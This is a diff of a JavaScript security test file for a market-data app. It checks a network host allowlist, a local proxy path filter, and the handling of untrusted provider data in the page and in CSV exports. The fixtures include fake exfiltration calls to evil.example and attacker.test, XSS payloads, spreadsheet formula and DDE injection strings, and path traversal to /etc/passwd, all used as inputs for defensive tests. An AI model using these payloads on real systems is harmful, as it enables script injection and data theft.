@@ -1,10 +1,10 @@
 /**
- * The privacy and security promises, as tests.
+ * The properties the README promises, as tests.
  *
- * The source audit is the mechanical half (no external references, no network,
- * no persistence, no innerHTML, no eval). The rest checks that hostile text from
- * an imported CSV stays inert everywhere it can travel: into the statistics, into
- * the summary, into the exports and into a download filename.
+ * This app is now a network client, so the guarantee is not "no requests" - it
+ * is "only these hosts". The rest is about treating provider data as untrusted:
+ * asset names and symbols are strings a third party controls, and they travel
+ * into the DOM, into notifications and into an exported file.
  */
 
 import test from 'node:test';
@@ -13,180 +13,198 @@ import path from 'node:path';
 import { readFile } from 'node:fs/promises';
 import { fileURLToPath } from 'node:url';
 
-import { auditSources, SHIPPED_FILES, stripComments } from '../scripts/audit.mjs';
-import { validateDataset } from '../src/lib/validate.js';
-import { computeStats } from '../src/lib/stats.js';
-import { selectRows } from '../src/lib/selection.js';
-import { buildSummary } from '../src/lib/summary.js';
-import { buildCsv, buildTextReport, safeFileName } from '../src/lib/exporters.js';
-import { parseCsv, quoteCsvCell } from '../src/lib/csv.js';
+import { ALLOWED_HOSTS, auditSources, isDisallowedUrl, SHIPPED_FILES, stripComments } from '../scripts/audit.mjs';
+import { buildHistoryCsv, neutralizeFormula, safeFileName } from '../src/lib/exporters.js';
+import { isAllowedYahooPath } from '../scripts/serve.mjs';
+import * as binance from '../src/providers/binance.js';
+import * as finnhub from '../src/providers/finnhub.js';
 
 const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
 
-/* ------------------------------------------------------------------- audit */
+/* -------------------------------------------------------------------- audit */
 
-test('no shipped file reaches the network, persists data, or writes HTML', async () => {
+test('no shipped file contacts a host outside the provider allowlist', async () => {
   const findings = await auditSources(root, [...SHIPPED_FILES]);
   assert.deepEqual(findings, []);
 });
 
-test('the audit actually catches what it claims to catch', async () => {
-  // Guards against an audit that passes because its patterns are broken.
+test('the audit catches what it claims to catch', async () => {
   const cases = [
-    ['fetch.js', 'export const go = () => fetch("/x");', /uses fetch\(/],
-    ['store.js', 'export const go = (v) => { localStorage.setItem("k", v); };', /localStorage/],
+    ['exfil.js', 'export const go = () => fetch("https://evil.example/collect");', /non-allowlisted host/],
+    ['ws.js', 'export const s = new WebSocket("wss://attacker.test/feed");', /non-allowlisted host/],
     ['html.js', 'export const go = (n, t) => { n.innerHTML = t; };', /innerHTML/],
     ['eval.js', 'export const go = (s) => eval(s);', /uses eval\(/],
-    ['remote.js', 'import x from "https://cdn.example.com/x.js";', /external module/],
+    ['track.js', 'export const go = () => window.gtag("event", "x");', /analytics/],
     ['page.html', '<script src="https://cdn.example.com/x.js"></script>', /external reference/],
     ['sheet.css', '@import url("https://fonts.example.com/x.css");', /@import/],
+    // The CSV reader is gone and must stay gone.
+    ['old.js', 'import { parseCsv } from "./csv.js";', /CSV import module/],
+    ['upload.html', '<input type="file" accept=".csv">', /file input/],
   ];
 
   const { mkdtemp, writeFile } = await import('node:fs/promises');
   const { tmpdir } = await import('node:os');
   const scratch = await mkdtemp(path.join(tmpdir(), 'datascope-audit-'));
+
   for (const [name, source, expected] of cases) {
     await writeFile(path.join(scratch, name), source, 'utf8');
     const findings = await auditSources(scratch, [name]);
-    assert.equal(findings.length >= 1, true, name);
+    assert.ok(findings.length >= 1, `${name} produced no finding`);
     assert.match(findings.join('\n'), expected, name);
   }
 });
 
-test('the audit ignores forbidden words inside comments and namespace URLs', () => {
-  const code = stripComments(`
-    // this one mentions localStorage in a line comment
-    /* and innerHTML in a block comment */
-    const ns = 'http://www.w3.org/2000/svg';
-    const path = 'a//b';
-  `);
-  assert.equal(code.includes('localStorage'), false);
-  assert.equal(code.includes('innerHTML'), false);
-  assert.equal(code.includes('http://www.w3.org/2000/svg'), true);
-  assert.equal(code.includes('a//b'), true);
+test('the allowlist is the set of hosts the app is documented to use', () => {
+  for (const host of ['api.binance.com', 'stream.binance.com', 'api.coingecko.com', 'finnhub.io', 'ws.finnhub.io']) {
+    assert.ok(ALLOWED_HOSTS.includes(host), host);
+  }
+  assert.equal(isDisallowedUrl('https://api.binance.com/api/v3/ping'), false);
+  assert.equal(isDisallowedUrl('wss://ws.finnhub.io?token=x'), false);
+  assert.equal(isDisallowedUrl('/api/yahoo/v8/finance/chart/AAPL'), false);
+  assert.equal(isDisallowedUrl('https://evil.example'), true);
+  // A lookalike host must not pass on a prefix match.
+  assert.equal(isDisallowedUrl('https://api.binance.com.evil.example'), true);
 });
 
-test('the DOM layer only ever sets text, never markup', async () => {
+test('the audit ignores forbidden words inside comments', () => {
+  const code = stripComments(`
+    // this comment mentions innerHTML and https://evil.example
+    /* and eval( in a block comment */
+    const ns = 'http://www.w3.org/2000/svg';
+  `);
+  assert.equal(code.includes('innerHTML'), false);
+  assert.equal(code.includes('evil.example'), false);
+  assert.equal(code.includes('http://www.w3.org/2000/svg'), true);
+});
+
+test('no shipped module assigns HTML from a string', async () => {
   for (const relative of SHIPPED_FILES.filter((file) => file.endsWith('.js'))) {
     const code = stripComments(await readFile(path.join(root, relative), 'utf8'));
-    assert.equal(/innerHTML|outerHTML|insertAdjacentHTML|document\.write/.test(code), false, relative);
+    assert.equal(
+      /innerHTML|outerHTML|insertAdjacentHTML|document\.write/.test(code),
+      false,
+      relative,
+    );
   }
-  // And the one place that creates elements uses textContent.
-  const dom = await readFile(path.join(root, 'src/ui/dom.js'), 'utf8');
-  assert.match(dom, /textContent/);
 });
 
-test('the page declares no external origin and no inline analytics', async () => {
-  const raw = await readFile(path.join(root, 'index.html'), 'utf8');
-  // Comments are removed first: they describe what the page avoids, using the
-  // very words this test searches for.
-  const html = raw.replace(/<!--[\s\S]*?-->/g, ' ');
-  assert.equal(/https?:\/\/(?!www\.w3\.org)/.test(html), false);
-  assert.equal(/gtag|analytics|googletagmanager|sentry|hotjar|telemetry/i.test(html), false);
-  assert.match(raw, /כלי לימודי לניתוח נתונים היסטוריים/);
+test('the CSV import path is gone from the whole shipped app', async () => {
+  for (const relative of SHIPPED_FILES) {
+    const source = await readFile(path.join(root, relative), 'utf8');
+    const code = relative.endsWith('.js') ? stripComments(source) : source;
+    assert.equal(/\bparseCsv\b/.test(code), false, relative);
+    assert.equal(/\bFileReader\b/.test(code), false, relative);
+    assert.equal(/type\s*=\s*["']file["']/.test(code), false, relative);
+    assert.equal(/\bdrop(zone)?\b.*dataTransfer/.test(code), false, relative);
+  }
 });
 
-/* ------------------------------------------------ hostile imported content */
+/* ------------------------------------------------------------- yahoo proxy */
 
-const HOSTILE_SYMBOLS = [
+test('the local proxy forwards only the two Yahoo paths the app uses', () => {
+  assert.equal(isAllowedYahooPath('/v8/finance/chart/AAPL'), true);
+  assert.equal(isAllowedYahooPath('/v1/finance/search'), true);
+
+  // Anything else would make this an open proxy on the user's machine.
+  assert.equal(isAllowedYahooPath('/v7/finance/download/AAPL'), false);
+  assert.equal(isAllowedYahooPath('/'), false);
+  assert.equal(isAllowedYahooPath('/v8/finance/chart/'), false);
+  assert.equal(isAllowedYahooPath('/v8/finance/chart/../../etc/passwd'), false);
+  assert.equal(isAllowedYahooPath('/v8/finance/chart/AAPL/extra'), false);
+  assert.equal(isAllowedYahooPath('//evil.example/'), false);
+});
+
+/* -------------------------------------------- provider data is untrusted */
+
+const HOSTILE_NAMES = [
   '<script>alert(1)</script>',
   '<img src=x onerror=alert(1)>',
   '=HYPERLINK("http://evil.example","x")',
   '"><svg/onload=alert(1)>',
-  'javascript:alert(1)',
   '../../etc/passwd',
   '-2+3+cmd|calc',
 ];
 
-function importHostile(symbol) {
-  // Quoted with the project's own CSV quoter, which is how such a value would
-  // legitimately appear in a file someone exported from another tool.
-  const cell = quoteCsvCell(symbol);
-  const csv =
-    'date,symbol,close,volume\n' +
-    `2024-01-02,${cell},100,10\n` +
-    `2024-01-03,${cell},110,20\n`;
-  const result = validateDataset(csv, { fileName: 'hostile.csv' });
-  assert.equal(result.ok, true, symbol);
-  return result.dataset;
-}
-
-test('hostile symbols import as ordinary text and keep working as selectors', () => {
-  for (const symbol of HOSTILE_SYMBOLS) {
-    const dataset = importHostile(symbol);
-    assert.deepEqual(dataset.symbols, [symbol], symbol);
-    const rows = selectRows(dataset.rows, { symbol });
-    assert.equal(rows.length, 2, symbol);
-    assert.equal(computeStats(rows).count, 2, symbol);
+test('a hostile asset name from a provider survives parsing as plain text', () => {
+  for (const name of HOSTILE_NAMES) {
+    const assets = finnhub.parseSearch({
+      result: [{ description: name, displaySymbol: 'EVIL', symbol: 'EVIL', type: 'Common Stock' }],
+    });
+    assert.equal(assets.length, 1, name);
+    assert.equal(typeof assets[0].name, 'string', name);
+    // Nothing is stripped or escaped here - it stays data, and the DOM layer
+    // renders it with textContent. The audit above is what enforces that.
+    assert.equal(assets[0].symbol, 'EVIL');
   }
 });
 
-test('a hostile symbol stays inert in the CSV export and round-trips as text', () => {
-  for (const symbol of HOSTILE_SYMBOLS) {
-    const dataset = importHostile(symbol);
-    const csv = buildCsv(dataset.rows);
-    const { records } = parseCsv(csv);
-    const exported = records[1].cells[1];
+test('a hostile symbol from a provider cannot break the asset key or the chart', () => {
+  const assets = binance.parseExchangeInfo({
+    symbols: [
+      { symbol: '<img src=x onerror=alert(1)>', status: 'TRADING', baseAsset: 'X', quoteAsset: 'USDT' },
+    ],
+  });
+  assert.equal(assets.length, 1);
+  assert.equal(assets[0].key, 'binance:<IMG SRC=X ONERROR=ALERT(1)>');
+  assert.equal(typeof assets[0].displaySymbol, 'string');
+});
 
-    // Never starts a formula.
-    assert.equal(/^[=+\-@\t\r]/.test(exported), false, symbol);
-    // The original text is preserved (possibly behind a leading apostrophe), so
-    // nothing is silently altered or dropped.
-    assert.ok(exported === symbol || exported === `'${symbol}`, symbol);
-    // CSV structure survives: still exactly four columns per row.
-    for (const record of records) assert.equal(record.cells.length, 4, symbol);
+test('exported alert history neutralises spreadsheet formulas', () => {
+  const csv = buildHistoryCsv([
+    {
+      ts: Date.UTC(2024, 0, 2, 10, 30),
+      name: '=cmd|\' /C calc\'!A0',
+      displaySymbol: '+EVIL',
+      type: 'price',
+      ruleLabel: '-1+1',
+      price: 100,
+      value: 1,
+      body: '@SUM(A1)',
+    },
+  ]);
+  const cells = csv.split('\r\n')[1].split(',');
+  for (const cell of cells) {
+    const unquoted = cell.replace(/^"|"$/g, '');
+    assert.equal(/^[=+\-@\t\r]/.test(unquoted), false, cell);
+  }
+  assert.match(csv, /'=cmd/);
+  assert.match(csv, /'\+EVIL/);
+});
+
+test('ordinary values are left untouched by the formula guard', () => {
+  assert.equal(neutralizeFormula('Apple Inc.'), 'Apple Inc.');
+  assert.equal(neutralizeFormula('BTC/USDT'), 'BTC/USDT');
+  assert.equal(neutralizeFormula('100.25'), '100.25');
+  assert.equal(neutralizeFormula('ביטקוין'), 'ביטקוין');
+});
+
+test('an export filename cannot be shaped by provider data', () => {
+  for (const label of [...HOSTILE_NAMES, '', '  ', '..']) {
+    const name = safeFileName(label, '2026-09-19', 'csv');
+    assert.match(name, /^datascope_[A-Za-z0-9._-]+_2026-09-19\.csv$/, label);
+    assert.equal(name.includes('/'), false);
+    assert.equal(name.includes('..'), false);
+    assert.equal(name.includes('<'), false);
   }
 });
 
-test('a hostile symbol cannot shape the download filename', () => {
-  for (const symbol of HOSTILE_SYMBOLS) {
-    const name = safeFileName(symbol, '2026-09-19', 'csv');
-    assert.match(name, /^datascope_[A-Za-z0-9._-]+_2026-09-19\.csv$/, symbol);
-    assert.equal(name.includes('/'), false, symbol);
-    assert.equal(name.includes('\\'), false, symbol);
-    assert.equal(name.includes('..'), false, symbol);
-    assert.equal(name.includes('<'), false, symbol);
+/* ---------------------------------------------------------------- the page */
+
+test('the page loads no external script, stylesheet or font', async () => {
+  const raw = await readFile(path.join(root, 'index.html'), 'utf8');
+  const html = raw.replace(/<!--[\s\S]*?-->/g, ' ');
+  // Only the inline SVG namespace may appear as an absolute URL in the markup.
+  for (const match of html.matchAll(/\b(?:src|href)\s*=\s*"([^"]*)"/g)) {
+    const value = match[1];
+    const isLocal = !/^[a-z][a-z0-9+.-]*:/i.test(value) || value.startsWith('data:');
+    assert.ok(isLocal, `external asset: ${value}`);
   }
+  assert.equal(/gtag|googletagmanager|sentry|hotjar/i.test(html), false);
 });
 
-test('the report and summary carry hostile text as plain strings', () => {
-  const symbol = '<img src=x onerror=alert(1)>';
-  const dataset = importHostile(symbol);
-  const stats = computeStats(selectRows(dataset.rows, { symbol }));
-  const summary = buildSummary({
-    symbol,
-    fileName: 'hostile.csv',
-    isDemo: false,
-    requestedRange: { from: null, to: null },
-    stats,
-  });
-  const report = buildTextReport({
-    symbol,
-    fileName: 'hostile.csv',
-    isDemo: false,
-    requestedRange: { from: null, to: null },
-    stats,
-    summary,
-    generatedAt: '2026-09-19',
-  });
-  assert.equal(typeof report, 'string');
-  assert.ok(report.includes(symbol));
-  for (const paragraph of summary.paragraphs) assert.equal(typeof paragraph, 'string');
-});
-
-test('an oversized cell is truncated in the issue report, so a report cannot be flooded', () => {
-  const huge = 'x'.repeat(5000);
-  const result = validateDataset(`date,symbol,close,volume\n${huge},AAA,100,1\n`);
-  assert.equal(result.ok, false);
-  const issue = result.issues.find((item) => item.kind === 'invalid-date');
-  assert.ok(issue.value.length < 60);
-  assert.ok(issue.value.endsWith('…'));
-});
-
-test('a file name from the operating system is only ever used as text', () => {
-  const result = validateDataset('date,symbol,close,volume\n2024-01-02,AAA,100,1\n', {
-    fileName: '<script>alert(1)</script>.csv',
-  });
-  assert.equal(result.ok, true);
-  assert.equal(result.dataset.fileName, '<script>alert(1)</script>.csv');
+test('the page has no file input and no drop zone left anywhere', async () => {
+  const html = await readFile(path.join(root, 'index.html'), 'utf8');
+  assert.equal(/type\s*=\s*"file"/.test(html), false);
+  assert.equal(/dropzone/i.test(html), false);
+  assert.equal(/CSV/.test(html.replace(/ייצוא ל־CSV/g, '')), false, 'CSV should only survive as an export label');
 });
